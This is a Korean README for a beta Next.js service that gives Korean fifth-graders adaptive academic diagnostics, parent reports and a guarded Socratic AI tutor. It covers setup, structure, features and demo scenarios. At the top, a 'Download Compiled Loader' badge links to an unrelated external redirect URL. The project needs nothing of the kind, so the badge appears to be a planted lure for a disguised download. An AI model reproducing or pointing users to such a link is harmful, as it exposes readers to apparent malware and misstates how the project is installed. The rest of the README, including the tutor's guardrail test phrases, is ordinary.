# kidsdiag — 초5 학력진단·심화학습 MVP (베타 v0.1)

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

한국창의영재교육원 + 이노하이의 초등 5학년 대상 정밀 학력 진단 및 AI 심화학습 서비스.

## 🚀 빠른 시작

```bash
cd ~/Desktop/kidsdiag-app
npm install
npm run dev
```

브라우저에서 [http://localhost:3000](http://localhost:3000) 접속.

## 📂 프로젝트 구조

```
kidsdiag-app/
├── app/                          # Next.js App Router
│   ├── page.tsx                  # 랜딩 페이지
│   ├── select/                   # 학생·과목 선택
│   ├── diagnose/[sessionId]/     # 적응형 진단 (학생용)
│   ├── result/[sessionId]/       # 진단 결과 (학생/공통)
│   ├── parent/report/[childId]/  # 학부모 정밀 리포트
│   ├── tutor/                    # AI 튜터 채팅
│   └── api/
│       ├── diagnose/             # CAT 엔진 API
│       └── tutor/chat/           # AI 튜터 API (3중 가드레일)
├── lib/
│   ├── types.ts                  # 핵심 타입
│   ├── data.ts                   # 인메모리 스토어 + 데이터 로더
│   ├── cat/
│   │   ├── irt.ts                # IRT 2PL/3PL + Newton-Raphson MLE
│   │   └── engine.ts             # CAT 엔진 (출제·종료·결손트리)
│   ├── llm/
│   │   ├── adapter.ts            # LLM 추상화 (Claude ↔ 로컬 스위칭)
│   │   └── mock.ts               # 데모용 Mock LLM
│   ├── recommend/
│   │   └── recommender.ts        # 학습 경로 추천
│   └── tutor/
│       ├── guardrails.ts         # 3중 가드레일
│       └── socratic.ts           # Socratic 5단계 힌트
└── data/
    ├── concept_graph.json        # 개념맵 (22 노드 + 20 엣지, 데모용)
    └── items.json                # 검수된 문항 풀 (20문항, 데모용)
```

## ✅ 구현된 기능

### 학생 흐름
- ✅ 랜딩 페이지 → 데모 학생 선택
- ✅ 적응형 진단 (CAT + IRT 2PL)
- ✅ 학년 거슬러 추적 (오답 2회 → 선수개념 노드로)
- ✅ 행동 데이터 수집 (풀이시간, 답 변경 횟수)
- ✅ 종료 조건 (SE 임계값 / 시간 / 문항 수)
- ✅ 결과 산출 (마스터리 % + 신뢰구간 + 결손 트리)
- ✅ 게이미피케이션 (점수, 레벨)

### 학부모 흐름
- ✅ 정밀 리포트 (마스터리 + 또래 비교 + 신뢰구간)
- ✅ 결손 트리 시각화 (학년 거슬러 경로 표시)
- ✅ AI 진단 요약
- ✅ 학습 경로 추천 (5단계 시퀀스)
- ✅ 재진단 일정 가이드 (2주 / 3개월)

### AI 튜터
- ✅ Socratic 5단계 점진적 힌트 (방향→개념→공식→과정→확인)
- ✅ 3중 가드레일 (입력 필터 / 응답 검증 / 정답 누설 검출)
- ✅ 자해/학대 신호 감지 + 안내 메시지 (1388)
- ✅ LLM 추상화 레이어 (Mock → Claude → 로컬 스위칭 가능)

## ⏳ 베타 이후 작업

| 영역 | 현재 | 베타 이후 |
|---|---|---|
| **DB** | 인메모리 (서버 재시작 시 초기화) | PostgreSQL + Drizzle ORM (Supabase) |
| **인증** | 데모 학생 자동 진입 | Supabase Auth + 학부모→자녀 모델 + 법정대리인 동의 |
| **LLM** | Mock 어댑터 (정해진 응답) | Claude API → EXAONE/SOLAR 마이그레이션 |
| **문항** | 20개 (수작업) | 1,000+ (item-generator + 전문가 검수) |
| **개념맵** | 22 노드 (수작업) | 200+ 노드 (curriculum-mapper 자동 생성) |
| **시각화** | 단순 카드 | D3.js force-directed graph |
| **PDF 다운로드** | 버튼만 (미구현) | Puppeteer 기반 |
| **이벤트 트래킹** | 없음 | PostHog 12종 이벤트 |
| **접근성** | 기본 | WCAG 2.2 AA + TTS |
| **배포** | 로컬 | Vercel + Supabase |

## 🔑 환경 변수

```bash
# .env.local
LLM_PROVIDER=mock    # mock | claude | exaone | solar | qwen
ANTHROPIC_API_KEY=   # claude 사용 시
```

## 🧪 데모 시나리오

### 시나리오 A: 학생이 진단을 보는 흐름
1. 랜딩 → "👉 무료 진단 체험하기" 클릭
2. 데모 학생(민지) 자동 선택 → 과목 선택 (수학/국어)
3. 약 5~10문항 풀이 (CAT 적응형)
4. 결과 페이지: 점수·레벨·강점·약점·결손 트리·학습 경로

### 시나리오 B: 학부모가 리포트를 보는 흐름
1. 랜딩 → "학부모 리포트 미리보기" 클릭
2. 진단 완료 후 정밀 리포트 확인:
   - 또래 비교, 결손 트리 (학년 거슬러), 학습 경로, 재진단 일정

### 시나리오 C: AI 튜터 가드레일 테스트
1. `/tutor` 접속
2. **정상**: "어떻게 풀어야 할지 모르겠어" → 단계적 힌트
3. **욕설 차단**: "바보야" → 정중한 안내 + 로그
4. **자해 신호**: "죽고 싶어" → 1388 안내 + 학부모 알림 (콘솔 로그)
5. **정답 직답 시도**: AI가 정답을 직접 노출하면 → fallback 응답으로 대체

## 📚 참고

- 하네스 (에이전트 9개 명세): `~/.claude/projects/kidsdiag/`
- 기획서 PDF v0.2: `~/Desktop/kidsdiag-doc/kidsdiag-summary-v2.pdf`

## 📝 라이선스

베타 단계, 내부용. 한국창의영재교육원 자료는 라이선스 화이트리스트 통과분만 사용.
